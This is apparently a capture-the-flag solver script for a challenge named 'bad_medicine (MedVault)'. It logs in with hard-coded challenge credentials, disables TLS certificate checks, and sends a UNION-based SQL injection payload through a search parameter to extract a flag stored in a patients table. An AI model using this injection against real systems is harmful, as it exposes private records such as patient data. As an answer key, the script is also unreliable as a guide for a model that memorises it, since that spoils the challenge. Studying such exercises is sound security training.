#!/usr/bin/env python3
"""
bad_medicine (MedVault) solver.

Login with the sticky-note creds, then exploit the UNION-based SQL injection in
the medication search (?q=). The flag hides as a patient's phone number, so we
UNION the patients table into the 5-column result set and pull rstcon{...} out.

Usage:
    python3 solve.py                       # local https://127.0.0.1:5000
    python3 solve.py https://HOST:5000     # deployed instance (self-signed TLS)
"""
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request

base = (sys.argv[1] if len(sys.argv) > 1 else "https://127.0.0.1:5000").rstrip("/")

# the challenge serves a self-signed cert; don't verify it
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ctx),
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
)


def post(path, data):
    body = urllib.parse.urlencode(data).encode()
    return opener.open(base + path, body, timeout=10).read().decode(errors="replace")


def get(path):
    return opener.open(base + path, timeout=10).read().decode(errors="replace")


# 1) authenticate (creds are on the sticky note in the challenge photo)
post("/login", {"username": "skim", "password": "PharmD#2026!"})

# 2) UNION the patients table in; the 5 SELECTed columns are
#    id, name, ndc, category, quantity -> drop phone into the 2nd (name) slot.
payload = "' UNION SELECT 1, phone, 1, 1, 1 FROM patients-- -"
html = get("/?q=" + urllib.parse.quote(payload))

m = re.search(r"rstcon\{[^}]*\}", html)
print(m.group(0) if m else "flag not found (is the session logged in?)")
